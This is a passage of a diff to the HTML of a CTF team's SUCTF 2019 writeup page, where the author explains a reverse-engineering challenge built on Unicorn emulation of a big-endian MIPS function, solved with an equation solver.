 </span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;math.h&gt;</span><span class=cp>
 </span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/ptrace.h&gt;</span><span class=cp>
@@ -1046,7 +2059,7 @@ You win!</p><h3 id=akira-homework>Akira Homework</h3><p>程序是一个Windows�
 </span></span><span class=line><span class=cl>        <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;no input files&#34;</span><span class=p>);</span>
 </span></span><span class=line><span class=cl>    <span class=p>}</span>
 </span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span></code></pre></div><p>出这个题的原因是最近在看各种奇奇怪怪的fuzz,8月初平安银河实验室推了一个基于libfuzzer和unicorn模拟执行的fuzzing工具,是利用了unicorn来进行模拟执行,然后利用libfuzzer提供的__libfuzzer_extra_counters接收覆盖率,进行数据的变异等操作
+</span></span></code></pre></td></tr></table></div></div><p>出这个题的原因是最近在看各种奇奇怪怪的fuzz,8月初平安银河实验室推了一个基于libfuzzer和unicorn模拟执行的fuzzing工具,是利用了unicorn来进行模拟执行,然后利用libfuzzer提供的__libfuzzer_extra_counters接收覆盖率,进行数据的变异等操作
 出题的时候使用的是mips-linux-gnu-gcc在ubuntu1604下编译出的一个大端序的mips32,这里编写了一个类似<code>void func(char * in,char * out)</code>的函数,因为unicorn对于原生函数的调用的支持不是很好,所以这个函数里面没有用到库函数以及系统调用
 函数里设置了一个位运算,以及一个42元方程,函数运行后会返回方程的值,这里的值也是大端序的,然后进行比较.题目无混淆无花,模拟执行的算法也是很基础的,事先也给了依赖库,目的是想让各位师傅们了解一下这个神奇的模拟引擎(希望我不是最后一个知道的),在出题的过程中也发现了一个问题就是z3对于这个42元方程的速度异常的慢.
 这个场景下的unicorn感觉可以用在iot的fuzz上,不过要注意的是这东西毕竟是模拟执行,所以效率不是很高</p><p>解题思路就是学一波unicorn,然后根据uc_open函数参数的值找到要模拟字节码的架构,然后使用对应的反编译工具对func文件进行逆向,dump出大端序的res,用求解器算出flag</p><h2 id=crypto>Crypto</h2><p>详情见 <a href=http://team-su.github.io/passages/2019-08-22-SUCTF/Crypto-WriteUp.html>Writeup.html</a>。</p><div class=blog-tags><a href=https://su-team.cn/tags/suctf/>SUCTF</a>&nbsp;</div><h4 class=see-also>See also</h4><ul><li><a href=/post/2025-suctf-official-writeup-docker/>2025 SUCTF 官方WriteUp&amp;Docker</a></li></ul></article><ul class="pager blog-pager"><li class=next><a href=https://su-team.cn/post/bytectf-2019-su-wu/ data-toggle=tooltip data-placement=top title="ByteCTF 2019 SU Write Up">Next Post &rarr;</a></li></ul></div></div></div><footer><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><ul class="list-inline text-center footer-links"><li><a href=https://ctftime.org/team/29641 title=CTFTime><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
@@ -1056,4 +2069,4 @@ You win!</p><h3 id=akira-homework>Akira Homework</h3><p>程序是一个Windows�
 &nbsp;&bull;&nbsp;&copy;
 2016-2026
 &nbsp;&bull;&nbsp;
-<a href=https://su-team.cn/>su-team</a></p><p class="credits theme-by text-muted"><a href=https://gohugo.io>Hugo v0.148.2</a> powered &nbsp;&bull;&nbsp; Theme <a href=https://github.com/halogenica/beautifulhugo>Beautiful Hugo</a> adapted from <a href=https://deanattali.com/beautiful-jekyll/>Beautiful Jekyll</a></p></div></div></div></footer><script defer src=https://su-team.cn/js/katex.min.js></script><script defer src=https://su-team.cn/js/auto-render.min.js onload=renderMathInElement(document.body)></script><script src=https://su-team.cn/js/jquery-3.7.0.slim.min.js></script><script src=https://su-team.cn/js/bootstrap.min.js></script><script src=https://su-team.cn/js/main.js></script><script src=https://su-team.cn/js/highlight.min.js></script><script>hljs.initHighlightingOnLoad()</script><script>$(document).ready(function(){$("pre.chroma").css("padding","0")})</script><script src=https://su-team.cn/js/photoswipe.min.js></script><script src=https://su-team.cn/js/photoswipe-ui-default.min.js></script><script src=https://su-team.cn/js/load-photoswipe.js></script></body></html>
+<a href=https://su-team.cn/>su-team</a></p><p class="credits theme-by text-muted"><a href=https://gohugo.io>Hugo v0.148.2</a> powered &nbsp;&bull;&nbsp; Theme <a href=https://github.com/halogenica/beautifulhugo>Beautiful Hugo</a> adapted from <a href=https://deanattali.com/beautiful-jekyll/>Beautiful Jekyll</a></p></div></div></div></footer><script defer src=https://su-team.cn/js/katex.min.js></script><script defer src=https://su-team.cn/js/auto-render.min.js onload=renderMathInElement(document.body)></script><script src=https://su-team.cn/js/jquery-3.7.0.slim.min.js></script><script src=https://su-team.cn/js/bootstrap.min.js></script><script src=https://su-team.cn/js/main.js></script><script src=https://su-team.cn/js/photoswipe.min.js></script><script src=https://su-team.cn/js/photoswipe-ui-default.min.js></script><script src=https://su-team.cn/js/load-photoswipe.js></script></body></html>
